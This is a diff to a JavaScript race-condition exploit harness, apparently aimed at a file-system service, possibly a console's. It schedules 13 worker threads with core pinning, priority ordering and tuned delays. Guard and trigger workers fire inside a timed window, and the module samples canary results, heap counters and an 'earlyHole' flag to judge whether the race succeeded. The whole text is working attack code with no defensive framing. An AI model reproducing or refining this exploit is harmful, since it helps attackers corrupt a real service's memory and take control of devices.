@@ -33,6 +33,11 @@ const {
 
 // ── Wave planning and configuration ───────────────────────────────────────
 
+// Workers are pinned to one core with decreasing priorities so
+// dispatch order is deterministic. roleDelays are kept so server-side
+// processing overlaps correctly: without them, all 10 initial requests
+// arrive as a burst and the server finishes the quick ones before
+// W9's sequential sends let the guards/trigger fire.
 export function buildPlans(input) {
     const config = input.config;
     let REQ = input.REQ;
@@ -44,23 +49,45 @@ export function buildPlans(input) {
     let rootSession = input.rootSession;
     let triggerBuf = input.triggerBuf;
     var plans = [];
+
     for (var i = 0; i < 13; i++) {
+        if (config.workerRoles.indexOf(i) < 0) {
+            plans.push([SLEEP(0)]);
+            continue;
+        }
+
         var steps = [WAIT(gates.masterGate)];
+
+        // W0-W9: stagger with roleDelays for server-side overlap.
+        // Priority ordering guarantees dispatch order within the
+        // same delay bucket; the delays give long operations (Commit,
+        // Read) a head start so they are still in-flight when the
+        // guards and trigger fire.
         if (i < 10) {
             steps.push(SLEEP(config.roleDelays[i]));
-        } else if (i < 12) {
+        }
+
+        // W10-W11 (guards): gate-based, same as timed.
+        if (i >= 10 && i < 12) {
             steps.push(WAIT(gates.groupReleasedGate));
             steps.push(SLEEP(config.guardDelays[i - 10]));
-        } else {
-            // CivSwitchFS original: 1.6 ms; Slapah/Kurumuz reference: 2.4 ms.
-            steps.push(SLEEP(1600000));
+        }
+
+        // W12 (trigger): gate-based with abort-guard sampling.
+        // No initial sleep: on a single core with the lowest priority,
+        // W12 cannot run until all others are blocked. The gate
+        // already synchronises with W9's release signal.
+        if (i === 12) {
             steps.push(WAIT(gates.groupReleasedGate));
             steps.push(WAIT(gates.guardLaunchedGate));
             steps.push(SLEEP(400000));
-            steps.push(MCPY(gates.spacingDecision, gates.bottleneckFinished, 4));
+            steps.push(MCPY(gates.spacingDecision,
+                gates.bottleneckFinished, 4));
             steps.push(WAIT(gates.bottleneckDoneGate));
-            steps.push(MCPY(gates.sampledCompleted, gates.completedFlag, 4));
-            steps.push(MCPY(gates.sampledEarlyHole, gates.earlyHole, 4));
+            steps.push(MCPY(gates.sampledCompleted,
+                gates.completedFlag, 4));
+            steps.push(MCPY(gates.sampledEarlyHole,
+                gates.earlyHole, 4));
             steps.push(MCPY(0n, gates.sampledCompleted, 4));
             steps.push(MCPY(triggerBuf, gates.zeroByte, 0));
             steps.push(MCPY(0n, gates.sampledEarlyHole, 4));
@@ -68,29 +95,45 @@ export function buildPlans(input) {
             steps.push(MCPY(0n, gates.spacingDecision, 4));
             steps.push(MCPY(triggerBuf, gates.zeroByte, 0));
         }
+
+        // W9 (release): pin, clear, pre-release probes before its main send.
         if (i === 9) {
             steps.push(TICK(), SEND(pinPkt, rootSession), TICK());
             steps.push(TICK(), SEND(clearPkt, rootSession), TICK());
             steps.push(TICK(), SEND(prePkt, rootSession), TICK());
         }
+
+        // W11: sample bottleneck state and signal the trigger.
         if (i === 11) {
-            steps.push(MCPY(gates.earlyHole, gates.bottleneckFinished, 4));
+            steps.push(MCPY(gates.earlyHole,
+                gates.bottleneckFinished, 4));
             steps.push(SIGNAL(gates.guardLaunchedGate));
         }
+
+        // Every worker: timestamp → send → timestamp.
         steps.push(TICK());
         steps.push(SEND(REQ[i], roleHandles[i]));
         steps.push(TICK());
+
+        // Post-send signals.
         if (i === 1) {
             steps.push(SETB(gates.bottleneckFinished, 1));
             steps.push(SIGNAL(gates.bottleneckDoneGate));
         }
-        if (i === 9) steps.push(SIGNAL(gates.groupReleasedGate));
-        if (i === 0 || (i >= 2 && i <= 8) || i === 10 || i === 11) {
+
+        if (i === 9) {
+            steps.push(SIGNAL(gates.groupReleasedGate));
+        }
+
+        if (i === 0 || (i >= 2 && i <= 8) ||
+            i === 10 || i === 11) {
             steps.push(SETB(gates.completedFlag, 1));
             steps.push(SETB(gates.roleDoneFlags + BigInt(i), 1));
         }
+
         plans.push(steps);
     }
+
     return plans;
 }
 
@@ -245,14 +288,19 @@ function snapshotRenamePathBuffers(pathBuffers) {
     return snapshots;
 }
 
-function snapshotRenameDescriptors(REQ, pathBuffers) {
+function snapshotRenameDescriptors(REQ, pathBuffers, workerRoles) {
     if (!REQ || !pathBuffers) return null;
-    var roles = [
+    var allRoles = [
         {role: 7, first: "fillerSource", second: "fillerDestination"},
         {role: 8, first: "fillerSource", second: "fillerDestination"},
         {role: 10, first: "guardSource", second: "guardDestination"},
         {role: 11, first: "guardSource", second: "guardDestination"}
     ];
+    var roles = workerRoles
+        ? allRoles.filter(function(r) {
+            return workerRoles.indexOf(r.role) >= 0;
+        })
+        : allRoles;
     var output = [];
     var allMatch = true;
     for (var ri = 0; ri < roles.length; ri++) {
@@ -298,10 +346,10 @@ function snapshotRenameDescriptors(REQ, pathBuffers) {
     return {allMatch: allMatch, roles: output};
 }
 
-export function captureRenameInputState(REQ, pathBuffers) {
+export function captureRenameInputState(REQ, pathBuffers, workerRoles) {
     return {
         buffers: snapshotRenamePathBuffers(pathBuffers),
-        descriptors: snapshotRenameDescriptors(REQ, pathBuffers)
+        descriptors: snapshotRenameDescriptors(REQ, pathBuffers, workerRoles)
     };
 }
 
@@ -416,8 +464,7 @@ export function analyzeWave(profile, wave, waveData, group, createPinThisWave, i
     var ssv = Number(read32(gates.spacingDecision)) >>> 0;
     var triggerAborted = scv !== 0 || sev !== 0 || ssv !== 0;
 
-    var protectedRoleIds = [0, 2, 3, 4, 5, 6, 7, 8, 10, 11];
-    var protectedDone = protectedRoleIds.filter(function(role) {
+    var protectedDone = config.protectedRoles.filter(function(role) {
         return Number(read8(gates.roleDoneFlags + BigInt(role))) !== 0;
     }).length;
 
@@ -478,6 +525,16 @@ export function analyzeWave(profile, wave, waveData, group, createPinThisWave, i
         durationUs: preProbeTimingMeasured
             ? ticksToUs(preProbeEnd - preProbeStart) : null
     };
+    // W9 sends pin/clear/pre inside the race window; their round trips are
+    // server-load samples at the critical moment. The TICK steps around each
+    // SEND already store the timestamps, so this only reads them back.
+    var probeDurationUs = function(sendIndex) {
+        if (sendIndex < 0) return null;
+        var start = readFrameResult(waveData.frames[9].frame, sendIndex - 1);
+        var end = readFrameResult(waveData.frames[9].frame, sendIndex + 1);
+        if (start === FRAME_SENTINEL || end === FRAME_SENTINEL) return null;
+        return ticksToUs(end - start);
+    };
     var pinPersistentBytes = createPinThisWave && afterStats && group.before
         ? group.before[5] - afterStats[5] : null;
     var pinCostOk = !createPinThisWave ||
@@ -488,7 +545,7 @@ export function analyzeWave(profile, wave, waveData, group, createPinThisWave, i
             group.before[5]) <= config.HEAP_JITTER_BYTES);
 
     var sendCodes = [];
-    for (var ci = 0; ci < 13; ci++)
+    for (var ci = 0; ci < sendIndices.length; ci++)
         sendCodes.push(roleSendCode(waveData.frames, ci, sendIndices[ci]));
     var transportOk = sendCodes.filter(function(c) { return c === 0; }).length;
     var resultAt = function(index) {
@@ -511,7 +568,10 @@ export function analyzeWave(profile, wave, waveData, group, createPinThisWave, i
     var canaryType = typeAt(6, canaryResult);
     var triggerResult = resultAt(12);
     var triggerType = typeAt(12, triggerResult);
-    var fillerResults = [7, 8].map(resultAt);
+    var fillerRoles = [7, 8].filter(function(role) {
+        return config.workerRoles.indexOf(role) >= 0;
+    });
+    var fillerResults = fillerRoles.map(resultAt);
     var guardResults = [10, 11].map(resultAt);
     var health = queryCanaryHealth({canaryPath, savedHandle, setupPath, setupPkt});
 
@@ -536,7 +596,7 @@ export function analyzeWave(profile, wave, waveData, group, createPinThisWave, i
     if (canaryResult !== 0 || canaryType !== 1) changedPaths.push("canary");
     for (var fi = 0; fi < fillerResults.length; fi++)
         if (canonicalResultCode(fillerResults[fi]) !== 0x202)
-            changedPaths.push("filler" + fi);
+            changedPaths.push(config.roleLabels[fillerRoles[fi]]);
     for (var gi = 0; gi < guardResults.length; gi++)
         if (canonicalResultCode(guardResults[gi]) !== 0x202)
             changedPaths.push("guard" + gi);
@@ -560,18 +620,22 @@ export function analyzeWave(profile, wave, waveData, group, createPinThisWave, i
         return canonicalResultCode(r) === 0x202;
     });
 
-    var window = Boolean(reservationExpected && wave.done === 13 &&
-        transportOk === 13 && wave.joined === 13 &&
-        protectedDone === 10 && releaseWasSent &&
+    var window = Boolean(reservationExpected &&
+        wave.done === config.WORKER_COUNT &&
+        transportOk === config.WORKER_COUNT &&
+        wave.joined === config.WORKER_COUNT &&
+        protectedDone === config.protectedRoles.length &&
+        releaseWasSent &&
         Number(wave.signalResult) === 0 && trigSpan &&
-        overlap.shapeCount === 10 &&
+        overlap.shapeCount === config.OVERLAP_COUNT &&
         overlap.receiveMarginUs !== null && overlap.receiveMarginUs >= 300 &&
         !triggerAborted && tailsExpected && commitResult === 0 &&
         readResult === 0 && pathsExpected &&
         pinShapeOk && clearReply.result === 0 &&
         preReply.result === 0 && restored && pinCostOk &&
         (!createPinThisWave || pinWindowOk) && pinFirstWaveQualified &&
-        preReleaseUsed !== null && preReleaseUsed >= config.WINDOW_MINIMUM_CACHE_HELD);
+        preReleaseUsed !== null &&
+        preReleaseUsed >= config.WINDOW_MINIMUM_CACHE_HELD);
 
     var postCanaryHealthy = health.transport === 0 &&
         health.result === 0 && health.type === 1;
@@ -579,14 +643,14 @@ export function analyzeWave(profile, wave, waveData, group, createPinThisWave, i
 
     var wc = checkWindow({
         reservation: reservationExpected,
-        "workers-done": wave.done === 13,
-        transport: transportOk === 13,
-        "workers-join": wave.joined === 13,
-        "protected-10": protectedDone === 10,
+        "workers-done": wave.done === config.WORKER_COUNT,
+        transport: transportOk === config.WORKER_COUNT,
+        "workers-join": wave.joined === config.WORKER_COUNT,
+        "protected": protectedDone === config.protectedRoles.length,
         "release-sent": releaseWasSent,
         signal: Number(wave.signalResult) === 0,
         "trig-span": Boolean(trigSpan),
-        "shape-10": overlap.shapeCount === 10,
+        "shape": overlap.shapeCount === config.OVERLAP_COUNT,
         "margin>=300": overlap.receiveMarginUs !== null &&
             overlap.receiveMarginUs >= 300,
         "no-abort": !triggerAborted,
@@ -623,6 +687,22 @@ export function analyzeWave(profile, wave, waveData, group, createPinThisWave, i
             held: group.held ? group.held[5] : null,
             pre: preStats ? preStats[5] : null,
             after: afterStats ? afterStats[5] : null
+        },
+        // Full 16-field MemoryReportInfo vectors (peaks cleared on read, so
+        // each window summarizes retroactively what happened inside it).
+        // Field map: 0-2 pooled buffer (Commit pressure), 3-4+9 buffer
+        // manager (content cache), 5 exp heap, 6+10 buffer pool, 7-8 patrol
+        // read (background activity), 11 async pooled failures.
+        counterVector: {
+            before: group.before || null,
+            held: group.held || null,
+            pre: preStats,
+            after: afterStats
+        },
+        w9Probes: {
+            pinUs: probeDurationUs(pinSendIndex),
+            clearUs: probeDurationUs(clearSendIndex),
+            preUs: probeDurationUs(preSendIndex)
         },
         preProbeTiming: preProbeTiming,
         commitResult: commitResult,
